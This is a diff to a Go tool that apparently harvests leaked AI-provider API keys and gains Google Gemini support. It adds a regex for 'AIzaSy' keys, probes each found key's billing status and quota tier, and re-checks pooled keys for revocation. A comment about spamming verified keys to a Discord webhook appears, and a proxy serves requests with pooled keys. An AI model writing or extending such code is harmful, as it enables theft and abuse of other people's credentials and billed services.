@@ -642,6 +642,7 @@ var providerPriority = map[string]int{
         "cohere":      13,
         "elevenlabs":  14,
         "ai21":        15,
+        "google":       16,
 }
 
 func sortKeysByPriority(keys []KeyEntry) []KeyEntry {
@@ -1182,6 +1183,8 @@ func verifyKey(provider string, key string, timeout time.Duration) VerifyResult 
                 return verifyCohere(client, key)
         case "ai21":
                 return verifyAI21(client, key)
+        case "google":
+                return verifyGoogle(client, key)
         default:
                 return VerifyResult{Valid: true, Details: "regex-only"}
         }
@@ -1891,6 +1894,166 @@ func verifyAI21(client *http.Client, key string) VerifyResult {
         return VerifyResult{Valid: true, Details: "valid"}
 }
 
+func verifyGoogle(client *http.Client, key string) VerifyResult {
+        // Step 1: List models — validates the key and gets available models
+        listURL := fmt.Sprintf("https://generativelanguage.googleapis.com/v1beta/models?key=%s", key)
+        req, _ := http.NewRequest("GET", listURL, nil)
+        resp, err := client.Do(req)
+        if err != nil {
+                return failResult("request error")
+        }
+        defer resp.Body.Close()
+
+        if resp.StatusCode == 400 || resp.StatusCode == 403 {
+                return failResult("unauthorized")
+        }
+        if resp.StatusCode != 200 {
+                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
+        }
+
+        // Parse model list
+        body, _ := io.ReadAll(resp.Body)
+        var listResp struct {
+                Models []struct {
+                        Name string `json:"name"`
+                } `json:"models"`
+        }
+        json.Unmarshal(body, &listResp)
+
+        modelNames := make([]string, 0)
+        hasUltra := false
+        for _, m := range listResp.Models {
+                name := strings.TrimPrefix(m.Name, "models/")
+                name = strings.TrimSuffix(name, "-latest")
+                modelNames = append(modelNames, name)
+                if name == "gemini-1.0-ultra" {
+                        hasUltra = true
+                }
+        }
+
+        // Step 2: Test if key is alive — try a minimal generateContent request
+        aliveURL := fmt.Sprintf("https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-pro:generateContent?key=%s", key)
+        genReq, _ := json.Marshal(map[string]interface{}{
+                "generationConfig": map[string]interface{}{"max_output_tokens": 0},
+        })
+        req2, _ := http.NewRequest("POST", aliveURL, bytes.NewReader(genReq))
+        req2.Header.Set("Content-Type", "application/json")
+        resp2, err := client.Do(req2)
+        if err != nil {
+                result := VerifyResult{Valid: true, Details: "valid", Models: fmt.Sprintf("%d models", len(modelNames))}
+                if hasUltra {
+                        result.Models += " + ultra"
+                }
+                return result
+        }
+        defer resp2.Body.Close()
+
+        // Check for permanent 429
+        if resp2.StatusCode == 429 {
+                body2, _ := io.ReadAll(resp2.Body)
+                var errResp struct {
+                        Error struct {
+                                Message string `json:"message"`
+                        } `json:"error"`
+                }
+                json.Unmarshal(body2, &errResp)
+                if strings.Contains(errResp.Error.Message, "limit 'GenerateContent request limit per minute for a region'") {
+                        return failResult("perma-rate-limited")
+                }
+        }
+
+        // Step 3: Test billing
+        hasBilling := false
+        imagenURL := fmt.Sprintf("https://generativelanguage.googleapis.com/v1beta/models/imagen-4.0-generate-001:predict?key=%s", key)
+        imagenReq, _ := json.Marshal(map[string]interface{}{
+                "instances": []map[string]interface{}{{"prompt": ""}},
+        })
+        req3, _ := http.NewRequest("POST", imagenURL, bytes.NewReader(imagenReq))
+        req3.Header.Set("Content-Type", "application/json")
+        resp3, err := client.Do(req3)
+        if err == nil {
+                defer resp3.Body.Close()
+                if resp3.StatusCode == 400 {
+                        body3, _ := io.ReadAll(resp3.Body)
+                        if !strings.Contains(string(body3), "Imagen API is only accessible to billed users") {
+                                hasBilling = true
+                        }
+                }
+        }
+
+        // Step 4: Determine tier
+        tier := "Free Tier"
+        if hasBilling {
+                ttsURL := fmt.Sprintf("https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-pro-preview-tts:generateContent?key=%s", key)
+                ttsData := map[string]interface{}{
+                        "contents": []map[string]interface{}{
+                                {"parts": []map[string]interface{}{{"text": "hello"}}},
+                        },
+                        "generationConfig": map[string]interface{}{
+                                "responseModalities": []string{"AUDIO"},
+                        },
+                        "model": "gemini-2.5-pro-preview-tts",
+                }
+                ttsReq, _ := json.Marshal(ttsData)
+                req4, _ := http.NewRequest("POST", ttsURL, bytes.NewReader(ttsReq))
+                req4.Header.Set("Content-Type", "application/json")
+                resp4, err := client.Do(req4)
+                if err == nil {
+                        defer resp4.Body.Close()
+                        body4, _ := io.ReadAll(resp4.Body)
+                        if resp4.StatusCode == 200 {
+                                tier = "Tier 3+"
+                        } else if resp4.StatusCode == 400 {
+                                if strings.Contains(string(body4), "exceeds the maximum number of tokens") {
+                                        tier = "Tier 3"
+                                }
+                        } else if resp4.StatusCode == 429 {
+                                var errResp4 struct {
+                                        Error struct {
+                                                Details []json.RawMessage `json:"details"`
+                                        } `json:"error"`
+                                }
+                                json.Unmarshal(body4, &errResp4.Error.Details)
+                                for _, d := range errResp4.Error.Details {
+                                        var detail struct {
+                                                Violations []struct {
+                                                        QuotaMetric string `json:"quotaMetric"`
+                                                        QuotaValue  string `json:"quotaValue"`
+                                                } `json:"violations"`
+                                        }
+                                        json.Unmarshal(d, &detail)
+                                        for _, v := range detail.Violations {
+                                                if strings.Contains(v.QuotaMetric, "paid_tier") && v.QuotaValue == "10000" {
+                                                        tier = "Tier 1"
+                                                } else if strings.Contains(v.QuotaMetric, "tier_2") {
+                                                        tier = "Tier 2"
+                                                } else if strings.Contains(v.QuotaMetric, "free_tier") {
+                                                        tier = "Free Tier"
+                                                }
+                                        }
+                                }
+                        }
+                }
+        }
+
+        modelsStr := fmt.Sprintf("%d models", len(modelNames))
+        if hasUltra {
+                modelsStr += " + ultra"
+        }
+        balanceStr := ""
+        if hasBilling {
+                balanceStr = "Billing Enabled"
+        }
+
+        return VerifyResult{
+                Valid:   true,
+                Details: "valid",
+                Tier:    tier,
+                Balance: balanceStr,
+                Models:  modelsStr,
+        }
+}
+
 // ─── Discord Webhook Sender (no delay — spam those verified keys) ───────────
 
 type WebhookSender struct {
@@ -2287,6 +2450,9 @@ func buildDefaultRules() []struct {
 
                 // AI21 Labs — only match in env context
                 {"AI21 Key in .env", `(?:AI21_API_KEY|ai21_api_key)\s*[=:]\s*["']?[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}`, "ai21", true},
+
+                // Google AI Studio / MakerSuite / Gemini — distinctive AIzaSy prefix
+                {"Google AI Studio Key", `AIzaSy[A-Za-z0-9\-_]{33}`, "google", true},
         }
 }
 
@@ -2452,6 +2618,40 @@ func runHeadless(cfg Config, rules []Rule, tokenPool *TokenPool, scanJobs chan S
                         }
                         resp.Body.Close()
                         log.Printf("Self-ping OK: %s", healthURL)
+                }
+        }()
+
+        // Google key re-check every 5 minutes (Google can revoke keys quickly)
+        go func() {
+                time.Sleep(5 * time.Minute)
+                ticker := time.NewTicker(5 * time.Minute)
+                for range ticker.C {
+                        googleKeys := keyStore.GetValidKeys("google")
+                        if len(googleKeys) == 0 {
+                                continue
+                        }
+                        log.Printf("[google-recheck] Re-checking %d Google keys...", len(googleKeys))
+                        timeout := time.Duration(cfg.VerifyTimeout) * time.Second
+                        for _, k := range googleKeys {
+                                vr := verifyKey("google", k.KeyValue, timeout)
+                                if !vr.Valid {
+                                        keyStore.DeleteKey(k.ID)
+                                        log.Printf("[google-recheck] Google key %d REVOKED: %s", k.ID, vr.Details)
+                                        if wsHub != nil {
+                                                wsHub.Broadcast("newKey", VerifiedMatch{
+                                                        Provider: "google",
+                                                        Key:      k.KeyValue,
+                                                        Redacted: k.KeyValue[:6] + "..." + k.KeyValue[len(k.KeyValue)-4:],
+                                                        Valid:    false,
+                                                        Details:  "revoked: " + vr.Details,
+                                                })
+                                                wsHub.Broadcast("keyUpdate", map[string]interface{}{
+                                                        "id":     k.ID,
+                                                        "status": "deleted",
+                                                })
+                                        }
+                                }
+                        }
                 }
         }()
 
@@ -2922,7 +3122,7 @@ func isVerifiable(provider string) bool {
         case "openai", "anthropic", "mistral", "openrouter",
                 "elevenlabs", "deepseek", "xai", "huggingface", "groq",
                 "replicate", "perplexity", "together", "fireworks",
-                "cohere", "ai21":
+                "cohere", "ai21", "google":
                 return true
         default:
                 return false
@@ -2964,6 +3164,7 @@ var providerConfigs = map[string]ProviderConfig{
         "cohere":      {BaseURL: "https://api.cohere.ai", AuthHeader: "Authorization", AuthPrefix: "Bearer "},
         "elevenlabs":  {BaseURL: "https://api.elevenlabs.io", AuthHeader: "xi-api-key", AuthPrefix: ""},
         "ai21":        {BaseURL: "https://api.ai21.com", AuthHeader: "Authorization", AuthPrefix: "Bearer "},
+        "google":       {BaseURL: "https://generativelanguage.googleapis.com", AuthHeader: "", AuthPrefix: ""},
 }
 
 func handleAPIProxy(w http.ResponseWriter, r *http.Request) {
@@ -2998,7 +3199,15 @@ func handleAPIProxy(w http.ResponseWriter, r *http.Request) {
 
                 // Build target URL
                 targetURL := config.BaseURL + "/" + restPath
-                if r.URL.RawQuery != "" {
+
+                // Google uses ?key= query param instead of auth header
+                if provider == "google" {
+                        if strings.Contains(targetURL, "?") {
+                                targetURL += "&key=" + bestKey.KeyValue
+                        } else {
+                                targetURL += "?key=" + bestKey.KeyValue
+                        }
+                } else if r.URL.RawQuery != "" {
                         targetURL += "?" + r.URL.RawQuery
                 }
 
